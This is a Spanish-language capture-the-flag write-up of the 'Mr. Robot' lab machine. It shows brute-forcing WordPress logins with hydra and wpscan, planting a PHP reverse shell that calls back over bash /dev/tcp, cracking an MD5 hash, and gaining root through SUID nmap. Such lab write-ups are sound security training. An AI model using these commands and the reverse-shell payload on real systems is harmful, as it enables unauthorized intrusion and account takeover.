# Mr. Robot

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/9a2be6a9-8fa5-41e0-bf56-aa12c5967979)

***
- Source: https://app.hackthebox.com/machines/Hospital
- OS: Linux
- Dificultad: Medium
- IP: No estática
- Temas: `CMS`, `WordPress`, `Linux PrivEsc`, `Linux Enumeration`.
***

- Escaneo

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.116.39
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-10 13:23 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 13:23
Scanning 10.10.116.39 [65535 ports]
Discovered open port 443/tcp on 10.10.116.39
Discovered open port 80/tcp on 10.10.116.39
Increasing send delay for 10.10.116.39 from 0 to 5 due to 11 out of 20 dropped probes since last increase.
Completed SYN Stealth Scan at 13:23, 27.18s elapsed (65535 total ports)
Initiating Service scan at 13:23
Scanning 2 services on 10.10.116.39
Completed Service scan at 13:23, 16.57s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.116.39.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 7.32s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 2.09s elapsed
Nmap scan report for 10.10.116.39
Host is up, received user-set (0.25s latency).
Scanned at 2024-02-10 13:23:00 EST for 54s
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE    REASON         VERSION
80/tcp  open  tcpwrapped syn-ack ttl 61
443/tcp open  ssl/http   syn-ack ttl 61 Apache httpd

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.50 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 9 (392B)
~~~

- Tenemos una página que nos permite escribir ciertos "comandos".

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/61edf809-6e5a-4674-a66c-7852b57cec6c)

- Solo son videos
- Directorios:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ gobuster dir -u http://10.10.116.39/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.116.39/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog/                (Status: 403) [Size: 214]
/rss/                 (Status: 301) [Size: 0] [--> http://10.10.116.39/feed/]
/images/              (Status: 403) [Size: 216]
/login/               (Status: 302) [Size: 0] [--> http://10.10.116.39/wp-login.php]
/video/               (Status: 403) [Size: 215]
/feed/                (Status: 200) [Size: 807]
/0/                   (Status: 200) [Size: 8173]
/image/               (Status: 200) [Size: 11773]
/atom/                (Status: 301) [Size: 0] [--> http://10.10.116.39/feed/atom/]
/admin/               (Status: 200) [Size: 1077]
/wp-content/          (Status: 200) [Size: 0]
/audio/               (Status: 403) [Size: 215]
/wp-login/            (Status: 200) [Size: 2606]
/css/                 (Status: 403) [Size: 213]
/rss2/                (Status: 301) [Size: 0] [--> http://10.10.116.39/feed/]
/wp-includes/         (Status: 403) [Size: 221]
/js/                  (Status: 403) [Size: 212]
/Image/               (Status: 200) [Size: 11809]
/rdf/                 (Status: 301) [Size: 0] [--> http://10.10.116.39/feed/rdf/]
/page1/               (Status: 301) [Size: 0] [--> http://10.10.116.39/]
/dashboard/           (Status: 302) [Size: 0] [--> http://10.10.116.39/wp-admin/]
/wp-admin/            (Status: 302) [Size: 0] [--> http://10.10.116.39/wp-login.php?redirect_to=http%3A%2F%2F10.10.116.39%2Fwp-admin%2F&reauth=1]                                      
/phpmyadmin/          (Status: 403) [Size: 94]
~~~

- Es un WordPress.
- Tenemos un login:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/45d0c884-801e-495f-9aa1-7a5ed0fbac1f)

- Si seguimos buscando en `robots.txt` encontraremos rutas bastante curiosas:

~~~
User-agent: *
fsocity.dic
key-1-of-3.txt
~~~

- Una es una flag.
- Otra parece ser un diccionario de contraseñas.
- Intenté enumerar usuarios con `wp-scan` pero no hubo resultado.
- Realicé un ataque de fuerza bruta contra usuarios a través de hydra, dejando una contraseña por defecto:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ hydra -L u-list.dic -p test 10.10.116.39 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-10 14:10:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.116.39:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
[STATUS] 751.00 tries/min, 751 tries in 00:01h, 10701 to do in 00:15h, 16 active

[STATUS] 751.33 tries/min, 2254 tries in 00:03h, 9198 to do in 00:13h, 16 active
[STATUS] 754.43 tries/min, 5281 tries in 00:07h, 6171 to do in 00:09h, 16 active
[80][http-post-form] host: 10.10.116.39   login: ELLIOT   password: test
[80][http-post-form] host: 10.10.116.39   login: elliot   password: test
[80][http-post-form] host: 10.10.116.39   login: Elliot   password: test
~~~

- Y tenemos a un usuario `elliot`

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/3e3f7c4a-d19d-4f7f-bbf6-34d205df4cea)


- Así que podemos usar la wordlist para realizar otro ataque de fuerza bruta, esta vez hacia la contraseña.
- Para esto, me di cuenta que algunas contraseñas están repetidas, así que utilicé un comando para pasar solo las palabras no repetidas:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ uniq fsociety.dic > u-list.dic
~~~

- Una vez con esto, emplearé `wp-scan` para efectuar el ataque, proporcionandole el username:

~~~bash
┌──(root👹Dedsec)-[/home/kali/Maquinas/Linux/MrRobot]
└─# wpscan --url http://10.10.116.39/wp-login.php --passwords u-list.dic --usernames elliot
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.116.39/wp-login.php/ [10.10.116.39]
[+] Started: Sat Feb 10 14:00:47 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.116.39/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.116.39/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://10.10.116.39/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.116.39/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://10.10.116.39/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://10.10.116.39/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
Trying elliot / 009Average Time: 00:00:01 <> (14 / 11451)  0.12%  ETA: 

....WAIT TIME xd.....

Time: 00:02:02 <> (1177 / 11451) 10.27%  ETA: 00:17:[SUCCESS] - elliot / ER28-0652                                                                         
Trying elliot / erased Time: 00:09:38 <========                  > (5630 / 17081) 32.96%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: 'ER28-0652'

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Feb 10 14:10:48 2024
[+] Requests Done: 5829
[+] Cached Requests: 141
[+] Data Sent: 2.019 MB
[+] Data Received: 43.054 MB
[+] Memory used: 272.961 MB
[+] Elapsed time: 00:10:00
~~~

- Con estas contraseñas, nos logueamos en el WordPress.
- Editamos el apartado `Appearence --> Editor ---> 404.php` con una revshell de php:

~~~php
<?php
echo shell_exec('bash -c "bash -i >& /dev/tcp/10.2.60.167/4444 0>&1"');
?>
~~~

- Y visitamos `http://10.10.116.39/404` mientras estamos en escucha:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.116.39] 49322
bash: cannot set terminal process group (2162): Inappropriate ioctl for device
bash: no job control in this shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ 
~~~

- Realizamos un tratamiento de la TTY, en este caso no pude hacerlo de manera tradicional y spawneé una con Python:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

- Busqué archivos de configuración pero no vi nada.
- Indagué en las carpetas de usuarios y en robot encontré algo curioso:

~~~bash
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home 
cd /home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
~~~

- Una contraseña hasheada.
- La podemos crackear con `john`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/MrRobot]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt password.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)     
1g 0:00:00:00 DONE (2024-02-10 15:14) 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s boogieman..1234123
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
~~~

- Nos cambiamos de usuario con las credenciales.
- Ahora, enumeramos algunos archivos con permisos especiales, encontramos algo muy interesante:

~~~bash
robot@linux:~$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
~~~

- Vemos que nmap poseé permisos SUID, con lo que bastaría entrar en modo interactivo y ejecutar una bash, que se creará como una de root:

~~~bash
robot@linux:/tmp$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
~~~

- Y así de fácil hemos rooteado la máquina.

